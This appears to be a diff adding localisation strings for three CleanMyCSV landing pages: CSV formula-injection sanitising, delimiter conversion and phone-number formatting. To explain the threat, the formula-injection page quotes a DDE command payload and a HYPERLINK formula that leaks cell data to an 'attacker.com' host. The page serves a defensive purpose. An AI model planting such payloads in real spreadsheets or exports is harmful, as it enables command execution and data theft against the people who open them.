@@ -682,5 +682,125 @@
       "title": "Boost your Klaviyo deliverability and campaign engagement today.",
       "btn": "Clean My Klaviyo CSV Now"
     }
+  },
+  "formula_page": {
+    "meta": {
+      "title": "Sanitize CSV Formula Injection Online | Anti-Exploit Guard | CleanMyCSV",
+      "desc": "Sanitize CSV files against Formula Injection vulnerabilities (=, +, -, @). Automatically escape malicious Excel payload characters and secure spreadsheet exports online."
+    },
+    "hero": {
+      "title": "Sanitize CSV Formula Injection & Protect Spreadsheets",
+      "subtitle": "Are user-submitted web forms or survey exports exposing your team to Excel CSV Injection attacks?<br><br>CleanMyCSV detects and neutralizes malicious <code>=</code>, <code>+</code>, <code>-</code>, and <code>@</code> formula prefixes automatically before you open files locally.",
+      "cta": "Sanitize My CSV File Free"
+    },
+    "badges": {
+      "b1": "OWASP CSV Injection Shield",
+      "b2": "Ephemeral In-Memory Engine",
+      "b3": "Instant Single-Quote Escaping"
+    },
+    "issues": {
+      "title": "Understanding CSV Formula Injection (OWASP Risk)",
+      "subtitle": "Spreadsheet applications like Microsoft Excel and Google Sheets automatically execute formulas starting with dynamic operators. Here is how CleanMyCSV secures your organization:"
+    },
+    "issue1": {
+      "title": "1. The Threat: Remote Command & Data Exfiltration Payload",
+      "desc": "When attackers input text like <code>=CMD|' /C calc.exe'!A0</code> or <code>=HYPERLINK(\"http://attacker.com/leak?data=\"&A2)</code> into web forms, exporting those records into a CSV creates an executable payload inside Excel. Opening the file can execute local system commands or silently exfiltrate private worksheet data."
+    },
+    "issue2": {
+      "title": "2. Automated Single-Quote Escaping (')",
+      "desc": "CleanMyCSV parses every text cell in isolated memory. If a value begins with an unsafe operator (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>) and is not a legitimate mathematical number, our engine prefixes it with a single quote (e.g. <code>'=CMD...</code>). Excel renders the payload as harmless static text without executing it."
+    },
+    "issue3": {
+      "title": "3. Intelligent Mathematical Distinction",
+      "desc": "Naive security scripts break standard negative values or phone numbers starting with <code>+</code>. CleanMyCSV uses context-aware regex to differentiate between pure mathematical numbers (e.g. <code>-14.50</code> or <code>+33 6 12 34 56 78</code>) and actual formula injection vectors."
+    },
+    "issue4": {
+      "title": "4. Enterprise-Grade Security & Zero-Storage Pipeline",
+      "desc": "Security-conscious teams cannot risk uploading files to persistent third-party servers. CleanMyCSV runs on secure Google Cloud Run instances: data processing happens purely in-memory, signed links expire in 15 minutes, and temporary storage buckets are automatically wiped within 24 hours."
+    },
+    "cta_banner": {
+      "title": "Secure user exports and web form CSVs before opening them locally.",
+      "btn": "Sanitize My CSV Security Risk"
+    }
+  },
+  "delimiter_page": {
+    "meta": {
+      "title": "Convert CSV Semicolon to Comma Online | Delimiter Fixer | CleanMyCSV",
+      "desc": "Instantly convert CSV column delimiters from semicolons (;) to commas (,) online. Fix European Excel CSV separator mismatches without broken columns or formulas."
+    },
+    "hero": {
+      "title": "Convert CSV Semicolon to Comma Online",
+      "subtitle": "Did European Excel dump all your CSV columns into a single unreadable row using semicolons (<code>;</code>)?<br><br>CleanMyCSV auto-detects separators, splits merged columns, and standardizes your file into comma-delimited (<code>,</code>) structure instantly.",
+      "cta": "Convert My CSV Delimiter Free"
+    },
+    "badges": {
+      "b1": "Smart Delimiter Converter",
+      "b2": "Quoted Text & Address Safety",
+      "b3": "Instant Column Realignment"
+    },
+    "issues": {
+      "title": "Why Do CSV Column Separators Break?",
+      "subtitle": "Regional operating system settings create conflicts between European and International software. Here is how CleanMyCSV fixes delimiter bugs:"
+    },
+    "issue1": {
+      "title": "1. The Regional Excel Delimiter Conflict",
+      "desc": "In Europe, Microsoft Excel uses the comma (<code>,</code>) as a decimal separator (e.g. <code>12,50 €</code>). To avoid confusion, Excel exports CSV columns using semicolons (<code>;</code>). However, US web apps like Google Sheets, Airtable, Notion, and Shopify expect commas (<code>,</code>) as column separators, causing all attributes to merge into column A."
+    },
+    "issue2": {
+      "title": "2. Text Protection (Commas Inside Quoted Strings)",
+      "desc": "Basic \"Find & Replace\" tools ruin CSV files by converting commas contained inside street addresses or product descriptions (e.g., <code>\"123 Main St, Suite 400\"</code>). CleanMyCSV uses a context-aware parser (PapaParse engine) that respects quoted boundaries and only converts actual column boundaries."
+    },
+    "issue3": {
+      "title": "3. Decimal & Currency Conversion Integration",
+      "desc": "When converting semicolons to commas, numerical values like <code>10,50</code> must simultaneously be converted into dot decimals (<code>10.50</code>) so US software reads them as true mathematical numbers instead of text. CleanMyCSV handles delimiter and decimal normalization in a single step."
+    },
+    "issue4": {
+      "title": "4. Automatic UTF-8 BOM Encoding Upgrade",
+      "desc": "In addition to delimiter conversion, CleanMyCSV converts legacy Windows ANSI and MacRoman encodings to UTF-8 with BOM. This ensures your converted file opens with clean accents and aligned headers across all operating systems."
+    },
+    "cta_banner": {
+      "title": "Re-align your merged CSV columns in under 5 seconds.",
+      "btn": "Convert Delimiters Now"
+    }
+  },
+  "phone_page": {
+    "meta": {
+      "title": "Format Phone Numbers in CSV to E.164 Standard Online | CleanMyCSV",
+      "desc": "Bulk format and normalize phone numbers in CSV files to international E.164 standard. Add country codes, strip extensions, and restore missing leading zeros online."
+    },
+    "hero": {
+      "title": "Bulk Format Phone Numbers in CSV to E.164 Standard",
+      "subtitle": "Are messy phone formats like <code>06.12.34.56.78</code>, <code>+33(0)6...</code>, or missing country codes ruining your cold calling and SMS campaigns?<br><br>CleanMyCSV normalizes phone numbers into clean international E.164 formats automatically.",
+      "cta": "Normalize Phone Numbers Free"
+    },
+    "badges": {
+      "b1": "E.164 International Standard",
+      "b2": "Twilio & Dialer Ready",
+      "b3": "Anti-ID Protection Guard"
+    },
+    "issues": {
+      "title": "How CleanMyCSV Fixes Phone Number Messes",
+      "subtitle": "Sales prospects and scraped lead lists come with erratic phone number formatting. Here is how our normalization engine cleans your file:"
+    },
+    "issue1": {
+      "title": "1. E.164 International Country Code Addition",
+      "desc": "Auto-dialers (Salesloft, Outreach, RingCentral) and SMS tools (Twilio, Klaviyo) require phone numbers starting with international prefix codes. CleanMyCSV converts local numbers into standard E.164 formats (e.g., turning <code>06 12 34 56 78</code> into <code>+33 6 12 34 56 78</code> for EU or <code>5550192834</code> into <code>+1 (555) 019-2834</code> for US)."
+    },
+    "issue2": {
+      "title": "2. Parasitic Symbol & Extension Extraction",
+      "desc": "Lead databases often combine multiple phone numbers (<code>0612345678 / 0123456789</code>) or append office extension tags (<code>ext. 102</code>). Our engine isolates primary phone numbers, extracts extension suffixes cleanly, and strips parasitic characters (dots, slashes, brackets)."
+    },
+    "issue3": {
+      "title": "3. Recovery of Initial Zeros Dropped by Excel",
+      "desc": "Opening a CSV in Excel frequently strips the leading zero from local numbers, turning <code>0612345678</code> into a 9-digit string <code>612345678</code>. CleanMyCSV detects truncated phone columns and restores missing leading zeros before formatting."
+    },
+    "issue4": {
+      "title": "4. Anti-ID Safeguard for Technical Codes",
+      "desc": "Unlike naive regex tools that alter every long number string, CleanMyCSV features a smart Anti-ID safeguard. Numeric strings exceeding 13 digits without standard phone punctuation (such as SIRET business numbers, EAN barcodes, or transaction IDs) are protected and left untouched."
+    },
+    "cta_banner": {
+      "title": "Ensure 100% dialer connectivity for your sales outreach lists.",
+      "btn": "Format Phone Numbers Now"
+    }
   }
 }
